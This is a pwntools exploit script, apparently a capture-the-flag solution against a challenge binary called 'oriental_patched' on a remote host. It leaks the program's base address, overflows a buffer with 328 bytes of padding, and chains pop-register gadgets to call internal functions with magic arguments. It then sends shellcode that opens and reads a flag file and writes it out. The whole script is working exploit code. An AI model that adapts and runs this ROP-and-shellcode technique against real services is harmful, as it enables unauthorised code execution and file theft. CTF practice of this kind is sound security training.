from pwn import *


elf = context.binary = ELF("./oriental_patched")

context.arch = "amd64"

# r = process("./oriental_patched")

NC = "nc 103.145.226.209 20022".split()

r = remote(NC[1], NC[2])

def goto(n):
    r.sendlineafter(b">> ", str(n).encode())

def leak():
    goto(2)
    r.sendlineafter(b") ", b"y")
    goto(3)
    r.recvuntil(b"I spilled some ")
    return eval(r.recvline(0))


elf.address = leak() - elf.sym.lookAround



print(hex(elf.address))

goto(1)
r.sendlineafter(b">> ", b"FOMO")

"""
    0x00000000000012e3 : pop rdi ; ret
    0x00000000000012c8 : pop rdx ; ret
    0x00000000000012da : pop rsi ; ret
    0x00000000000012d1 : pop rcx ; ret
"""

payload = b'a'*328
payload += p64(elf.address + 0x00000000000012e3) + p64(0x0DEADD34D)
payload += p64(elf.address + 0x00000000000012da) + p64(0x1234ABCD)
payload += p64(elf.address + 0x00000000000012c8) + p64(0x0CA77D099) + p64(elf.address + 0x00000000000012c8+1) + p64(elf.sym.underDevelopment)
payload += p64(elf.address + 0x00000000000012e3) + p64(0x0BEEFBEEF)
payload += p64(elf.address + 0x00000000000012da) + p64(0x0DEADCAFE)
payload += p64(elf.address + 0x00000000000012c8) + p64(0x0CAFECAFE)
payload += p64(elf.address + 0x00000000000012d1) + p64(0x0DEADBEEF) + p64(elf.address + 0x00000000000012c8+1)
payload += p64(elf.sym.aboveDevelopment)

r.sendline(payload)


sh  = shellcraft.open("./solve.py")
sh += shellcraft.read(3, 'rsp', 0x200)
sh += shellcraft.write(1, 'rsp', "rax")

# gdb.attach(r)
# pause()

s =shellcraft.open("flag_part_two.txt")
# s += shellcraft.getdents64('rax','rbp',0x100)
s += shellcraft.read('rax','rbp',0x100)
s += shellcraft.write(1,'rbp',0x100)

r.sendline(asm(s))

print(r.recvall())

r.interactive()